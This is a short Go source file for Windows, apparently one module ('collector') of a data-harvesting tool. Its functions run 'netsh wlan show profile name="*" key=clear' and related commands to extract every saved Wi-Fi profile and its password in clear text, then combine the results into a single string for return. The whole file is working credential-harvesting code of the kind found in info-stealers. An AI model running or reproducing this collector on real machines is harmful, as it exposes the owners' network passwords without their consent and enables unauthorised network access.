//go:build windows

package collector

import (
"os/exec"
"strings"
)

func CollectWifiProfiles() string {
cmd := exec.Command("cmd", "/c", "netsh wlan show profiles")
output, err := cmd.Output()
if err != nil {
return "Error: " + err.Error()
}
return strings.TrimSpace(string(output))
}

func CollectWifiPasswords() string {
cmd := exec.Command("cmd", "/c", "netsh wlan show profile name=\"*\" key=clear")
output, err := cmd.Output()
if err != nil {
return "Error: " + err.Error()
}
return strings.TrimSpace(string(output))
}

func CollectWifiAll() string {
var result strings.Builder
result.WriteString(CollectWifiProfiles())
result.WriteString(CollectWifiPasswords())
return result.String()
}
